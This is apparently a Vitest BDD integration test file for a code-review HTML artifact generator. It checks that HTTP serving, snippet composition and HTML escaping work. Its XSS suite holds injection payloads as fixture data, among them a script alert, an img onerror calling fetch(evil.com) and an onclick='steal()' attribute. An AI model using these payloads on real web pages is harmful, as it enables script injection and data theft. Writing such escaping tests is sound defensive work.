/**
 * BDD integration tests for the HTML artifact feature (part 1 of 2).
 *
 * These tests verify the public contracts of the feature end-to-end:
 *   1. generateReviewHtml → registerArtifact → HTTP serve (output survives the full pipeline)
 *   2. XSS boundary holds all the way through to the HTTP response
 *   3. Snippet library files exist on disk and all placeholders are well-formed
 *
 * The unit tests in generate-review-html.test.ts verify section presence and color
 * values in isolation. These BDD tests verify that the output survives the HTTP
 * serve cycle and that the snippet library integration works across all 5 snippets.
 *
 * Part 2 (generate-review-html-bdd-part2.test.ts) covers:
 *   4. Large dataset robustness (100+ files)
 *   5. Single-file review edge cases
 *   6. present_artifact html field contract
 */

import { readdirSync, readFileSync } from "node:fs";
import { request as httpRequest } from "node:http";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import {
  registerArtifact,
  removeArtifact,
  resetStateForTesting,
  startHttpServer,
  stopHttpServer,
} from "@app/http-server.ts";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { generateReviewHtml } from "../tools/generate-review-html.ts";
import type { UnifiedPrOutput } from "../tools/show-pr-impact.ts";

// ── Path constants ───────────────────────────────────────────────────────────

const __dirname = fileURLToPath(new URL(".", import.meta.url));
const SNIPPETS_DIR = join(__dirname, "../../../ui/snippets");

// ── HTTP helper ──────────────────────────────────────────────────────────────

const TEST_PORT = 24171;

async function httpGet(path: string): Promise<{ status: number; body: string }> {
  const port = TEST_PORT;
  return new Promise((resolve, reject) => {
    const req = httpRequest({ hostname: "127.0.0.1", method: "GET", path, port }, (res) => {
      let body = "";
      res.on("data", (chunk: Buffer) => {
        body += chunk.toString();
      });
      res.on("end", () => {
        resolve({ body, status: res.statusCode ?? 0 });
      });
    });
    req.on("error", reject);
    req.end();
  });
}

// ── Snippet composition helpers (mirrors agent's workflow) ───────────────────

function substituteSnippet(snippet: string, replacements: Record<string, string>): string {
  let result = snippet;
  for (const [key, value] of Object.entries(replacements)) {
    result = result.replaceAll(`{{${key}}}`, value);
  }
  return result;
}

function extractSnippetHtml(snippetContent: string): string {
  const withoutDocblock = snippetContent.replace(/^<!--[\s\S]*?-->\s*/m, "");
  return withoutDocblock.replace(/<style>[\s\S]*?<\/style>/g, "").trim();
}

function extractSnippetStyles(snippetContent: string): string {
  const styleMatches = snippetContent.match(/<style>([\s\S]*?)<\/style>/g) ?? [];
  return styleMatches.map((block) => block.replace(/<\/?style>/g, "").trim()).join("\n");
}

// ── Fixture factories ────────────────────────────────────────────────────────

function makePrep(overrides: Partial<UnifiedPrOutput["prep"]> = {}): UnifiedPrOutput["prep"] {
  return {
    blast_radius: [],
    diff_command: "git diff main..HEAD",
    files: [
      { layer: "features", path: "src/features/auth.ts", status: "modified" },
      { layer: "shared", path: "src/shared/utils.ts", status: "added" },
    ],
    impact_files: [],
    incremental: false,
    layers: [
      { file_count: 1, name: "features" },
      { file_count: 1, name: "shared" },
    ],
    narrative: "2 files changed",
    net_new_files: 1,
    total_files: 2,
    total_violations: 0,
    ...overrides,
  };
}

function makeReview(
  overrides: Partial<NonNullable<UnifiedPrOutput["review"]>> = {},
): NonNullable<UnifiedPrOutput["review"]> {
  return {
    files: ["src/features/auth.ts", "src/shared/utils.ts"],
    honored: ["validate-at-trust-boundaries"],
    score: {
      conventions: { passed: 4, total: 5 },
      opinions: { passed: 3, total: 4 },
      rules: { passed: 2, total: 3 },
    },
    verdict: "WARNING",
    violations: [
      {
        file_path: "src/features/auth.ts",
        message: "Missing input validation at trust boundary",
        principle_id: "validate-at-trust-boundaries",
        severity: "strong-opinion",
      },
    ],
    ...overrides,
  };
}

function makeFixture(overrides: Partial<UnifiedPrOutput> = {}): UnifiedPrOutput {
  return {
    blast_radius_by_file: [
      { dep_count: 55, file: "src/core/router.ts" },
      { dep_count: 23, file: "src/shared/config.ts" },
    ],
    co_change_warnings: [],
    has_review: true,
    hotspots: [],
    prep: makePrep(),
    review: makeReview(),
    status: "ok",
    subgraph: { edges: [], layers: [], nodes: [] },
    subsystems: [{ directory: "src/payments", file_count: 6, label: "new" }],
    ...overrides,
  };
}

// ── Server lifecycle ─────────────────────────────────────────────────────────

beforeAll(async () => {
  await startHttpServer(TEST_PORT);
});

afterAll(async () => {
  resetStateForTesting();
  await stopHttpServer();
});

// ────────────────────────────────────────────────────────────────────────────
// Suite 1: End-to-end pipeline — generateReviewHtml → HTTP serve
// ────────────────────────────────────────────────────────────────────────────

describe("generateReviewHtml → HTTP serve — end-to-end", () => {
  /**
   * Given: a realistic UnifiedPrOutput with WARNING verdict
   * When: the generated HTML is registered and served over HTTP
   * Then: the HTTP response body contains the verdict banner and major sections
   */
  it("WARNING verdict: generated HTML survives HTTP round-trip with all major sections", async () => {
    const html = generateReviewHtml(makeFixture());
    const key = "bdd/warning-e2e";
    registerArtifact(key, html, {});

    const res = await httpGet(`/artifact/${key}`);
    expect(res.status).toBe(200);

    expect(res.body).toContain("WARNING");
    expect(res.body).toContain("Fix Before Merge");
    expect(res.body).toContain("Violations by Principle");
    expect(res.body).toContain("Compliance Score");
    expect(res.body).toContain("Highest Blast Radius");
    expect(res.body).toContain("Changes by Layer");
    expect(res.body).toContain("New Subsystems Added");

    removeArtifact(key);
  });

  /**
   * Given: a UnifiedPrOutput with BLOCKING verdict and rule violations
   * When: the generated HTML is served over HTTP
   * Then: the HTTP response includes the BLOCKING badge and fix-before-merge copy
   */
  it("BLOCKING verdict: HTTP response contains blocking badge and fix copy", async () => {
    const html = generateReviewHtml(
      makeFixture({
        review: makeReview({
          verdict: "BLOCKING",
          violations: [
            {
              file_path: "src/core/engine.ts",
              message: "Side effects in pure function",
              principle_id: "pure-functions",
              severity: "rule",
            },
            {
              file_path: "src/shared/db.ts",
              message: "Missing error propagation",
              principle_id: "errors-are-values",
              severity: "rule",
            },
          ],
        }),
      }),
    );
    const key = "bdd/blocking-e2e";
    registerArtifact(key, html, {});

    const res = await httpGet(`/artifact/${key}`);
    expect(res.status).toBe(200);
    expect(res.body).toContain("BLOCKING");
    expect(res.body).toContain("to fix before merge");

    removeArtifact(key);
  });

  /**
   * Given: a UnifiedPrOutput with CLEAN verdict and no violations
   * When: the generated HTML is served over HTTP
   * Then: the HTTP response contains "Ready to merge"
   */
  it("CLEAN verdict: HTTP response contains Ready to merge copy", async () => {
    const html = generateReviewHtml(
      makeFixture({
        review: makeReview({ honored: ["pure-functions"], verdict: "CLEAN", violations: [] }),
      }),
    );
    const key = "bdd/clean-e2e";
    registerArtifact(key, html, {});

    const res = await httpGet(`/artifact/${key}`);
    expect(res.status).toBe(200);
    expect(res.body).toContain("CLEAN");
    expect(res.body).toContain("Ready to merge");

    removeArtifact(key);
  });

  /**
   * Given: a minimal UnifiedPrOutput with no review data (has_review: false)
   * When: the generated HTML is served over HTTP
   * Then: the HTTP response contains the "No review data available" fallback
   */
  it("no review data: HTTP response shows fallback message", async () => {
    const noReviewData: UnifiedPrOutput = {
      blast_radius_by_file: [],
      co_change_warnings: [],
      has_review: false,
      hotspots: [],
      prep: makePrep(),
      status: "ok",
      subgraph: { edges: [], layers: [], nodes: [] },
      subsystems: [],
    };
    const html = generateReviewHtml(noReviewData);
    const key = "bdd/no-review-e2e";
    registerArtifact(key, html, {});

    const res = await httpGet(`/artifact/${key}`);
    expect(res.status).toBe(200);
    expect(res.body).toContain("No review data available");
    expect(res.body).toContain("<!DOCTYPE html>");
    expect(res.body).toContain("<body>");

    removeArtifact(key);
  });
});

// ────────────────────────────────────────────────────────────────────────────
// Suite 2: XSS boundary — malicious input does not appear raw in HTTP response
// ────────────────────────────────────────────────────────────────────────────

describe("XSS boundary — malicious input sanitized in HTTP response", () => {
  /**
   * Given: a file path containing a <script> tag injection attempt
   * When: the HTML is generated and served over HTTP
   * Then: the file path content appears HTML-escaped in the response body.
   *
   * Note: the HTTP server itself injects a <script> block for window globals
   * (window.__CANON_DATA__) — that is expected and intentional. The XSS
   * boundary guarantees the attacker's payload is escaped, not that no
   * <script> tags appear at all.
   */
  it("script tag in file path: payload is HTML-escaped in HTTP response", async () => {
    const maliciousPath = "src/<script>alert('pwned')</script>/api.ts";
    const html = generateReviewHtml(
      makeFixture({
        review: makeReview({
          files: [maliciousPath],
          violations: [
            {
              file_path: maliciousPath,
              message: "test",
              principle_id: "validate-at-trust-boundaries",
              severity: "rule",
            },
          ],
        }),
      }),
    );
    const key = "bdd/xss-filepath";
    registerArtifact(key, html, {});

    const res = await httpGet(`/artifact/${key}`);
    expect(res.status).toBe(200);

    // The XSS payload must appear escaped — not as an active browser-executed tag
    expect(res.body).toContain("&lt;script&gt;");
    expect(res.body).toContain("alert(&#39;pwned&#39;)");
    // Attacker's specific payload must not appear as executable
    expect(res.body).not.toContain("<script>alert(");
    expect(res.body).not.toContain("</script>/api.ts");

    removeArtifact(key);
  });

  /**
   * Given: a violation message containing an event-handler injection attempt
   * When: the HTML is generated and served over HTTP
   * Then: the raw onerror attribute is absent from the HTTP response
   */
  it("onerror injection in violation message: escaped in HTTP response", async () => {
    const html = generateReviewHtml(
      makeFixture({
        review: makeReview({
          violations: [
            {
              file_path: "src/auth.ts",
              message: '<img src=x onerror="fetch(evil.com)">',
              principle_id: "secure-by-default",
              severity: "rule",
            },
          ],
        }),
      }),
    );
    const key = "bdd/xss-message";
    registerArtifact(key, html, {});

    const res = await httpGet(`/artifact/${key}`);
    expect(res.status).toBe(200);
    expect(res.body).not.toContain("<img src=x onerror=");
    expect(res.body).toContain("&lt;img src=x");

    removeArtifact(key);
  });

  /**
   * Given: a blast radius file path containing an injection payload
   * When: the HTML is generated and served over HTTP
   * Then: the injection payload is escaped in the HTTP response
   */
  it("injection in blast radius file path: escaped in HTTP response", async () => {
    const html = generateReviewHtml(
      makeFixture({
        blast_radius_by_file: [{ dep_count: 10, file: 'src/<evil onclick="steal()">path.ts' }],
      }),
    );
    const key = "bdd/xss-blast-radius";
    registerArtifact(key, html, {});

    const res = await httpGet(`/artifact/${key}`);
    expect(res.status).toBe(200);
    expect(res.body).not.toContain("<evil onclick=");
    expect(res.body).toContain("&lt;evil");

    removeArtifact(key);
  });

  /**
   * Given: a subsystem directory containing an ampersand (common in org names, paths)
   * When: the HTML is generated and served over HTTP
   * Then: the ampersand is escaped as &amp; in the HTTP response
   */
  it("ampersand in subsystem directory: escaped as &amp; in HTTP response", async () => {
    const html = generateReviewHtml(
      makeFixture({
        subsystems: [{ directory: "src/auth&payments", file_count: 3, label: "new" }],
      }),
    );
    const key = "bdd/ampersand-subsystem";
    registerArtifact(key, html, {});

    const res = await httpGet(`/artifact/${key}`);
    expect(res.status).toBe(200);
    expect(res.body).toContain("auth&amp;payments");

    removeArtifact(key);
  });
});

// ────────────────────────────────────────────────────────────────────────────
// Suite 3: Snippet library — all 5 snippets compose correctly
// ────────────────────────────────────────────────────────────────────────────

describe("snippet library — all 5 snippets integration", () => {
  const ALL_SNIPPETS = [
    "bar-chart-row.html",
    "compliance-bars.html",
    "severity-badge.html",
    "stats-card.html",
    "verdict-banner.html",
  ];

  /**
   * Given: the snippet library directory exists on disk
   * When: the directory is read
   * Then: all 5 expected snippet files are present
   */
  it("all 5 expected snippet files exist on disk", () => {
    const entries = readdirSync(SNIPPETS_DIR, { withFileTypes: true });
    const htmlFiles = new Set(
      entries.filter((e) => e.isFile() && e.name.endsWith(".html")).map((e) => e.name),
    );
    for (const expected of ALL_SNIPPETS) {
      expect(htmlFiles.has(expected), `Missing snippet: ${expected}`).toBe(true);
    }
  });

  /**
   * Given: the compliance-bars snippet
   * When: all 12 placeholders are substituted with values
   * Then: no {{}} tokens remain in the output
   */
  it("compliance-bars snippet: substituting all placeholders leaves no {{}} tokens", () => {
    const content = readFileSync(join(SNIPPETS_DIR, "compliance-bars.html"), "utf8");
    const substituted = substituteSnippet(content, {
      CONVENTIONS_COLOR: "#3498db",
      CONVENTIONS_PASSED: "4",
      CONVENTIONS_TOTAL: "5",
      CONVENTIONS_WIDTH: "80",
      OPINIONS_COLOR: "#f39c12",
      OPINIONS_PASSED: "3",
      OPINIONS_TOTAL: "4",
      OPINIONS_WIDTH: "75",
      RULES_COLOR: "#e74c3c",
      RULES_PASSED: "2",
      RULES_TOTAL: "3",
      RULES_WIDTH: "67",
    });
    expect(substituted).not.toContain("{{");
    expect(substituted).not.toContain("}}");
  });

  /**
   * Given: the severity-badge snippet
   * When: substituted for each of the three severity levels
   * Then: each produces the correct hardcoded hex color for that severity
   */
  it("severity-badge snippet: each severity level produces the correct hex color", () => {
    const content = readFileSync(join(SNIPPETS_DIR, "severity-badge.html"), "utf8");
    const cases: Array<{ severity: string; color: string; label: string }> = [
      { color: "#e74c3c", label: "rule", severity: "rule" },
      { color: "#f39c12", label: "opinion", severity: "strong-opinion" },
      { color: "#3498db", label: "convention", severity: "convention" },
    ];
    for (const { severity: _sev, color, label } of cases) {
      const substituted = substituteSnippet(content, {
        SEVERITY_COLOR: color,
        SEVERITY_LABEL: label,
      });
      expect(substituted).toContain(color);
      expect(substituted).toContain(label);
      expect(substituted).not.toContain("{{");
    }
  });

  /**
   * Given: the bar-chart-row snippet
   * When: substituted with label, width, value, and a custom bar color
   * Then: the output contains the bar width percentage and the custom color
   */
  it("bar-chart-row snippet: width and color substitution are correct", () => {
    const content = readFileSync(join(SNIPPETS_DIR, "bar-chart-row.html"), "utf8");
    const substituted = substituteSnippet(content, {
      BAR_COLOR: "hsl(210, 62%, 56%)",
      LABEL: "src/core/router.ts",
      VALUE: "55",
      WIDTH_PERCENT: "100",
    });
    expect(substituted).toContain("100%");
    expect(substituted).toContain("hsl(210, 62%, 56%)");
    expect(substituted).toContain("55");
    expect(substituted).toContain("src/core/router.ts");
    expect(substituted).not.toContain("{{");
  });

  /**
   * Given: all 5 snippets composed together into a single artifact
   * When: the artifact is served over HTTP
   * Then: the HTTP response contains structural CSS classes from each snippet
   */
  it("all 5 snippets compose into a served artifact (HTTP 200)", async () => {
    const bannerContent = readFileSync(join(SNIPPETS_DIR, "verdict-banner.html"), "utf8");
    const statsContent = readFileSync(join(SNIPPETS_DIR, "stats-card.html"), "utf8");
    const barsContent = readFileSync(join(SNIPPETS_DIR, "compliance-bars.html"), "utf8");
    const badgeContent = readFileSync(join(SNIPPETS_DIR, "severity-badge.html"), "utf8");
    const chartContent = readFileSync(join(SNIPPETS_DIR, "bar-chart-row.html"), "utf8");

    const substitutedBanner = substituteSnippet(bannerContent, {
      ACCENT_COLOR: "#27ae60",
      HEADLINE: "All checks passing",
      VERDICT: "CLEAN",
    });
    const substitutedStats = substituteSnippet(statsContent, {
      LABEL: "Files changed",
      VALUE: "12",
    });
    const substitutedBars = substituteSnippet(barsContent, {
      CONVENTIONS_COLOR: "#3498db",
      CONVENTIONS_PASSED: "5",
      CONVENTIONS_TOTAL: "5",
      CONVENTIONS_WIDTH: "100",
      OPINIONS_COLOR: "#34d399",
      OPINIONS_PASSED: "4",
      OPINIONS_TOTAL: "4",
      OPINIONS_WIDTH: "100",
      RULES_COLOR: "#34d399",
      RULES_PASSED: "3",
      RULES_TOTAL: "3",
      RULES_WIDTH: "100",
    });
    const substitutedBadge = substituteSnippet(badgeContent, {
      SEVERITY_COLOR: "#e74c3c",
      SEVERITY_LABEL: "rule",
    });
    const substitutedChart = substituteSnippet(chartContent, {
      BAR_COLOR: "#6c8cff",
      LABEL: "src/router.ts",
      VALUE: "42",
      WIDTH_PERCENT: "100",
    });

    const allStyles = [
      extractSnippetStyles(substitutedBanner),
      extractSnippetStyles(substitutedStats),
      extractSnippetStyles(substitutedBars),
      extractSnippetStyles(substitutedBadge),
      extractSnippetStyles(substitutedChart),
    ].join("\n");

    const composedHtml = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>All-5-Snippets Integration Test</title>
  <style>
    :root { --bg: #0c0f1a; --bg-card: rgba(255,255,255,0.06); --text: #b4b8c8; --text-muted: #636a80; --border: rgba(255,255,255,0.06); --accent: #6c8cff; --danger: #ff6b6b; --success: #34d399; }
    body { font-family: -apple-system, sans-serif; background: var(--bg); color: var(--text); margin: 0; }
    .stats-row { display: flex; gap: 12px; padding: 16px; }
    ${allStyles}
  </style>
</head>
<body>
  ${extractSnippetHtml(substitutedBanner)}
  <div class="stats-row">
    ${extractSnippetHtml(substitutedStats)}
  </div>
  ${extractSnippetHtml(substitutedBars)}
  ${extractSnippetHtml(substitutedBadge)}
  <div style="padding:12px;">
    ${extractSnippetHtml(substitutedChart)}
  </div>
</body>
</html>`;

    const key = "bdd/all-5-snippets";
    registerArtifact(key, composedHtml, {});

    const res = await httpGet(`/artifact/${key}`);
    expect(res.status).toBe(200);
    // Verify structural CSS classes from each snippet are present
    expect(res.body).toContain("verdict-banner"); // from verdict-banner.html
    expect(res.body).toContain("stat-card"); // from stats-card.html
    expect(res.body).toContain("compliance-score"); // from compliance-bars.html
    expect(res.body).toContain("severity-badge"); // from severity-badge.html
    expect(res.body).toContain("chart-row"); // from bar-chart-row.html

    removeArtifact(key);
  });
});
